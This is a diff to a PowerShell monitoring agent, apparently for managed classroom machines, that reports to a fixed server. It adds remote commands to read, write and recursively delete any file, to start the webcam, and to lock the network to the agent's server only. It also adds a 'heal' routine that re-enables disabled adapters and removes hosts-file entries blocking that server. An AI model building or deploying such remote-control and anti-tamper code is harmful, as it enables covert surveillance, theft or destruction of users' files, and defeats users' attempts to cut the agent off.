@@ -1568,6 +1568,8 @@ $Global:SharedState = [hashtable]::Synchronized(@{
     FrameTick     = 0
     VeyonStatus   = "disabled"
     VeyonRestarts = 0
+    NetRestricted = $false
+    NetHealCount  = 0
     BlockedApps   = @(Load-BlockedAppsConfig)
     RunningApps   = @()
     ActiveWindow  = ""
@@ -2024,14 +2026,290 @@ function Send-WsJson($ws, $obj) {
     } catch {}
 }
 
+$script:AppUsageDay = (Get-Date).ToString("yyyy-MM-dd")
+$script:AppUsageMap = @{}
+$script:LastUsageTick = [DateTime]::UtcNow
+$script:LastUsageSave = [DateTime]::MinValue
+$script:CachedBootHistory = $null
+$script:LastBootCheck = [DateTime]::MinValue
+$APP_USAGE_FILE = Join-Path $INSTALL_DIR "app_usage.json"
+
+try {
+    if (Test-Path $APP_USAGE_FILE) {
+        $uObj = ConvertFrom-Json ([System.IO.File]::ReadAllText($APP_USAGE_FILE, [System.Text.Encoding]::UTF8))
+        if ($uObj -and $uObj.date -eq $script:AppUsageDay -and $uObj.apps) {
+            foreach ($prop in $uObj.apps.PSObject.Properties) {
+                $script:AppUsageMap[$prop.Name] = [int]$prop.Value
+            }
+        }
+    }
+} catch {}
+
+function Update-WinAppUsage {
+    $now = [DateTime]::UtcNow
+    $dt = [Math]::Max(0.0, [Math]::Min(15.0, ($now - $script:LastUsageTick).TotalSeconds))
+    $script:LastUsageTick = $now
+    $today = (Get-Date).ToString("yyyy-MM-dd")
+    if ($script:AppUsageDay -ne $today) {
+        $script:AppUsageDay = $today
+        $script:AppUsageMap = @{}
+    }
+    $inc = [Math]::Max(1, [int][Math]::Round($dt))
+    if ($dt -gt 0 -and $Global:SharedState.RunningApps) {
+        foreach ($app in @($Global:SharedState.RunningApps | Select-Object -First 10)) {
+            $k = [string]$app
+            if ($k) {
+                $script:AppUsageMap[$k] = ([int]$script:AppUsageMap[$k]) + $inc
+            }
+        }
+    }
+    if (($now - $script:LastUsageSave).TotalSeconds -ge 25.0) {
+        $script:LastUsageSave = $now
+        try {
+            $json = ConvertTo-Json @{ date = $today; apps = $script:AppUsageMap } -Compress
+            [System.IO.File]::WriteAllText($APP_USAGE_FILE, $json, [System.Text.Encoding]::UTF8)
+        } catch {}
+    }
+}
+
+function Get-WinAppUsageList {
+    $list = New-Object System.Collections.Generic.List[object]
+    $blocked = @($Global:SharedState.BlockedApps)
+    foreach ($k in $script:AppUsageMap.Keys) {
+        $sec = [int]$script:AppUsageMap[$k]
+        if ($sec -le 0) { continue }
+        $isBlk = $false
+        foreach ($b in $blocked) {
+            if ($b -and ($k.ToLower() -like "*$($b.ToLower())*")) { $isBlk = $true; break }
+        }
+        $list.Add(@{ name = [string]$k; seconds = $sec; blocked = $isBlk })
+    }
+    return @($list | Sort-Object { $_.seconds } -Descending | Select-Object -First 20)
+}
+
+function Get-WinBootHistory {
+    $now = [DateTime]::UtcNow
+    if ($null -ne $script:CachedBootHistory -and ($now - $script:LastBootCheck).TotalSeconds -lt 60.0) {
+        return $script:CachedBootHistory
+    }
+    $script:LastBootCheck = $now
+    $hist = New-Object System.Collections.Generic.List[object]
+    try {
+        $upSec = [WinGuardSecurity]::GetUptimeSeconds()
+        $bootDt = (Get-Date).AddSeconds(-1 * $upSec)
+        $hist.Add(@{
+            boot         = $bootDt.ToString("yyyy-MM-dd HH:mm")
+            shutdown     = "running"
+            duration_sec = [int]$upSec
+            status       = "running"
+        })
+    } catch {}
+    try {
+        $evts = Get-WinEvent -FilterHashtable @{ LogName = 'System'; Id = @(6005, 6006) } -MaxEvents 30 -ErrorAction SilentlyContinue
+        $lastShut = $null
+        foreach ($ev in $evts) {
+            if ($ev.Id -eq 6006) {
+                $lastShut = $ev.TimeCreated
+            } elseif ($ev.Id -eq 6005 -and $ev.TimeCreated) {
+                $bStr = $ev.TimeCreated.ToString("yyyy-MM-dd HH:mm")
+                if ($hist.Count -gt 0 -and $hist[0].boot -eq $bStr) { continue }
+                $dur = if ($lastShut -and $lastShut -gt $ev.TimeCreated) { [int]($lastShut - $ev.TimeCreated).TotalSeconds } else { 7200 }
+                $sStr = if ($lastShut -and $lastShut -gt $ev.TimeCreated) { $lastShut.ToString("yyyy-MM-dd HH:mm") } else { "clean" }
+                $hist.Add(@{
+                    boot         = $bStr
+                    shutdown     = $sStr
+                    duration_sec = [Math]::Max(60, $dur)
+                    status       = "clean"
+                })
+                $lastShut = $null
+            }
+        }
+    } catch {}
+    $script:CachedBootHistory = @($hist | Select-Object -First 25)
+    return $script:CachedBootHistory
+}
+
+function Invoke-WinNetLock($enable) {
+    $Global:SharedState.NetRestricted = [bool]$enable
+    try {
+        & netsh.exe advfirewall firewall delete rule name="SG_NetLock_Allow_VPS" 2>&1 | Out-Null
+        & netsh.exe advfirewall firewall delete rule name="SG_NetLock_Allow_LAN" 2>&1 | Out-Null
+        & netsh.exe advfirewall firewall delete rule name="SG_NetLock_Allow_DNS" 2>&1 | Out-Null
+        & netsh.exe advfirewall firewall delete rule name="SG_NetLock_Block_Web" 2>&1 | Out-Null
+        if ($enable) {
+            $ips = @("103.149.172.179")
+            try {
+                [System.Net.Dns]::GetHostAddresses("orbstrike.com") | Where-Object { $_.AddressFamily -eq "InterNetwork" } | ForEach-Object { $ips += $_.IPAddressToString }
+            } catch {}
+            $remoteIpStr = ($ips | Select-Object -Unique) -join ","
+            & netsh.exe advfirewall firewall add rule name="SG_NetLock_Allow_VPS" dir=out action=allow remoteip="$remoteIpStr" 2>&1 | Out-Null
+            & netsh.exe advfirewall firewall add rule name="SG_NetLock_Allow_LAN" dir=out action=allow remoteip="LocalSubnet,192.168.0.0/16,10.0.0.0/8,127.0.0.1" 2>&1 | Out-Null
+            & netsh.exe advfirewall firewall add rule name="SG_NetLock_Allow_DNS" dir=out action=allow protocol=UDP remoteport=53,67,68 2>&1 | Out-Null
+            & netsh.exe advfirewall firewall add rule name="SG_NetLock_Block_Web" dir=out action=block protocol=TCP remoteport=80,443 2>&1 | Out-Null
+        }
+    } catch {}
+}
+
+function Invoke-WinNetHeal {
+    try {
+        $healed = $false
+        $downAdp = Get-NetAdapter -Physical -ErrorAction SilentlyContinue | Where-Object { $_.Status -eq "Disabled" }
+        if ($downAdp) {
+            $downAdp | Enable-NetAdapter -Confirm:$false -ErrorAction SilentlyContinue
+            $healed = $true
+        }
+        $hostsPath = "$env:SystemRoot\System32\drivers\etc\hosts"
+        if (Test-Path $hostsPath) {
+            $rawH = [System.IO.File]::ReadAllText($hostsPath)
+            if ($rawH -match "(?i)(orbstrike\.com|103\.149\.172\.179|sslip\.io)") {
+                $cleanH = ($rawH -split "`r?`n" | Where-Object { $_ -notmatch "(?i)(orbstrike\.com|103\.149\.172\.179|sslip\.io)" }) -join "`r`n"
+                [System.IO.File]::WriteAllText($hostsPath, $cleanH)
+                $healed = $true
+            }
+        }
+        & ipconfig.exe /flushdns 2>&1 | Out-Null
+        if ($healed) {
+            $Global:SharedState.NetHealCount = ([int]$Global:SharedState.NetHealCount) + 1
+        }
+    } catch {}
+}
+
+function Invoke-WinFsCommand($ws, $cmd, $payload) {
+    $homeDir = $env:USERPROFILE
+    $bookmarks = @(
+        @{ label = "Home"; path = $homeDir },
+        @{ label = "Desktop"; path = (Join-Path $homeDir "Desktop") },
+        @{ label = "Downloads"; path = (Join-Path $homeDir "Downloads") },
+        @{ label = "Documents"; path = (Join-Path $homeDir "Documents") },
+        @{ label = "C:\"; path = "C:\" }
+    )
+    $reqPath = if ($payload -and $payload.path) { ([string]$payload.path).Trim() } else { $homeDir }
+    if (-not $reqPath) { $reqPath = $homeDir }
+
+    if ($cmd -eq "FS_LIST") {
+        if (-not (Test-Path -LiteralPath $reqPath -PathType Container)) { $reqPath = $homeDir }
+        $entries = New-Object System.Collections.Generic.List[object]
+        $errMsg = $null
+        try {
+            Get-ChildItem -LiteralPath $reqPath -Force -ErrorAction Stop | Select-Object -First 250 | ForEach-Object {
+                $entries.Add(@{
+                    name   = $_.Name
+                    path   = $_.FullName
+                    is_dir = [bool]$_.PSIsContainer
+                    size   = $(if ($_.PSIsContainer) { 0 } else { [long]$_.Length })
+                    mtime  = [long]([DateTimeOffset]$_.LastWriteTimeUtc).ToUnixTimeMilliseconds()
+                })
+            }
+        } catch {
+            $errMsg = $_.Exception.Message
+        }
+        $parentDir = try { (Split-Path -Parent $reqPath) } catch { "" }
+        Send-WsJson $ws @{
+            type       = "fs_list_result"
+            machine_id = $MACHINE_ID
+            path       = $reqPath
+            parent     = [string]$parentDir
+            entries    = @($entries | Sort-Object @{Expression={-not $_.is_dir}}, @{Expression={$_.name}})
+            bookmarks  = $bookmarks
+            error      = $errMsg
+        }
+    } elseif ($cmd -eq "FS_READ") {
+        try {
+            $rawBytes = [System.IO.File]::ReadAllBytes($reqPath)
+            if ($rawBytes.Length -gt 200000) { $rawBytes = $rawBytes[0..199999] }
+            $txt = [System.Text.Encoding]::UTF8.GetString($rawBytes)
+            Send-WsJson $ws @{
+                type       = "fs_read_result"
+                machine_id = $MACHINE_ID
+                path       = $reqPath
+                content    = $txt
+                size       = $rawBytes.Length
+            }
+        } catch {
+            Send-WsJson $ws @{
+                type       = "fs_read_result"
+                machine_id = $MACHINE_ID
+                path       = $reqPath
+                content    = ""
+                error      = $_.Exception.Message
+            }
+        }
+    } elseif ($cmd -eq "FS_WRITE") {
+        try {
+            $content = if ($payload -and $null -ne $payload.content) { [string]$payload.content } else { "" }
+            [System.IO.File]::WriteAllText($reqPath, $content, (New-Object System.Text.UTF8Encoding($false)))
+            Send-WsJson $ws @{
+                type       = "fs_op_result"
+                machine_id = $MACHINE_ID
+                op         = "FS_WRITE"
+                path       = $reqPath
+                ok         = $true
+                message    = "Da luu file thanh cong"
+            }
+        } catch {
+            Send-WsJson $ws @{
+                type       = "fs_op_result"
+                machine_id = $MACHINE_ID
+                op         = "FS_WRITE"
+                path       = $reqPath
+                ok         = $false
+                error      = $_.Exception.Message
+            }
+        }
+    } elseif ($cmd -eq "FS_MKDIR") {
+        try {
+            New-Item -ItemType Directory -Path $reqPath -Force -ErrorAction Stop | Out-Null
+            Send-WsJson $ws @{
+                type       = "fs_op_result"
+                machine_id = $MACHINE_ID
+                op         = "FS_MKDIR"
+                path       = $reqPath
+                ok         = $true
+                message    = "Da tao thu muc"
+            }
+        } catch {
+            Send-WsJson $ws @{
+                type       = "fs_op_result"
+                machine_id = $MACHINE_ID
+                op         = "FS_MKDIR"
+                path       = $reqPath
+                ok         = $false
+                error      = $_.Exception.Message
+            }
+        }
+    } elseif ($cmd -eq "FS_DELETE") {
+        try {
+            Remove-Item -LiteralPath $reqPath -Recurse -Force -ErrorAction Stop
+            Send-WsJson $ws @{
+                type       = "fs_op_result"
+                machine_id = $MACHINE_ID
+                op         = "FS_DELETE"
+                path       = $reqPath
+                ok         = $true
+                message    = "Da xoa thanh cong"
+            }
+        } catch {
+            Send-WsJson $ws @{
+                type       = "fs_op_result"
+                machine_id = $MACHINE_ID
+                op         = "FS_DELETE"
+                path       = $reqPath
+                ok         = $false
+                error      = $_.Exception.Message
+            }
+        }
+    }
+}
+
 function Build-TelemetryPayload($msgType) {
+    Update-WinAppUsage
     $mem = [WinGuardSecurity]::GetMemoryMetrics()
     $dsk = Get-DiskMetrics
     $aud = [WinGuardSecurity]::GetAudioStatus()
     $cam = [WinGuardSecurity]::GetWebcamStatus()
     return @{
         type           = $msgType
-        agent_version  = "3.8"
+        agent_version  = "4.0"
         machine_id     = $MACHINE_ID
         hostname       = $HOSTNAME
         ip             = (Get-LocalIp)
@@ -2044,6 +2322,10 @@ function Build-TelemetryPayload($msgType) {
         lock_mouse     = [bool]$Global:SharedState.LockMouse
         veyon_status   = $Global:SharedState.VeyonStatus
         veyon_restarts = $Global:SharedState.VeyonRestarts
+        net_restricted = [bool]$Global:SharedState.NetRestricted
+        net_heal_count = [int]$Global:SharedState.NetHealCount
+        app_usage      = @(Get-WinAppUsageList)
+        boot_history   = @(Get-WinBootHistory)
         blocked_apps   = @($Global:SharedState.BlockedApps)
         running_apps   = @($Global:SharedState.RunningApps)
         active_window  = $Global:SharedState.ActiveWindow
@@ -2134,6 +2416,9 @@ while ($true) {
                                 if ($payload.machine_name) { $Global:SharedState.MachineName = $payload.machine_name }
                                 if ($null -ne $payload.live_focus) { $Global:SharedState.LiveFocus = [bool]$payload.live_focus }
                                 if ($payload.veyon_disabled) { $Global:SharedState.VeyonStatus = "disabled" }
+                                if ($null -ne $payload.net_restricted -and ([bool]$payload.net_restricted -ne [bool]$Global:SharedState.NetRestricted)) {
+                                    Invoke-WinNetLock ([bool]$payload.net_restricted)
+                                }
                                 if ($null -ne $payload.blocked_apps) {
                                     $Global:SharedState.BlockedApps = @($payload.blocked_apps)
                                     Save-BlockedAppsConfig $Global:SharedState.BlockedApps
@@ -2347,6 +2632,18 @@ while ($true) {
                                 [WinGuardSecurity]::StopWebcamStream()
                                 Send-WsStatus $ws
                             }
+                            "CAPTURE_WEBCAM" {
+                                [WinGuardSecurity]::StartWebcamStream()
+                                Send-WsStatus $ws
+                            }
+                            "SET_NET_LOCK" {
+                                $en = if ($null -ne $payload.enable) { [bool]$payload.enable } else { -not [bool]$Global:SharedState.NetRestricted }
+                                Invoke-WinNetLock $en
+                                Send-WsStatus $ws
+                            }
+                            { $_ -in @("FS_LIST", "FS_READ", "FS_WRITE", "FS_MKDIR", "FS_DELETE") } {
+                                Invoke-WinFsCommand $ws $cmd $payload
+                            }
                             "AUDIO_PLAY" {
                                 if ($payload.pcm_b64) {
                                     [WinGuardSecurity]::PlayPcmB64([string]$payload.pcm_b64)
@@ -2535,7 +2832,9 @@ while ($true) {
                 Send-WsStatus $ws
             }
         }
-    } catch {}
+    } catch {
+        Invoke-WinNetHeal
+    }
     finally {
         try { $ws.Dispose() } catch {}
     }
